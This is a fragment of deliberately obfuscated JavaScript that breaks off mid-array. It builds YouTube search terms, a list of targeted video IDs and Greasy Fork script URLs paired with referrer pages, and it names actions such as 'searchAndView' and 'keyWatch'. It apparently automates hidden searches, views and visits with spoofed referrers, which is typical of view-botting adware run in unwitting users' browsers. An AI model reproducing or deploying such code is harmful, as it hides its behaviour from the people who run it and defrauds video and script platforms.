searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + T(0x17) + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + V(0x2, 'PfZq') + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xa6 * 0x12 + 0x1fbb + -0x2b5d)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xf3a + 0x11d1 * -0x1 + 0x1 * 0x2a1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + T(0x20) + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + T(0x10) + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + T(0x9) + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0xf * -0x19d + 0x25be + -0x3dee);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    T(0x1d) + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    W(0x21) + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    V(0x7, 'j*OW') + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    V(0xe, 'Aabt') + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    T(0x12) + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    V(0x1e, '9CLs') + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + T(0x5) + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
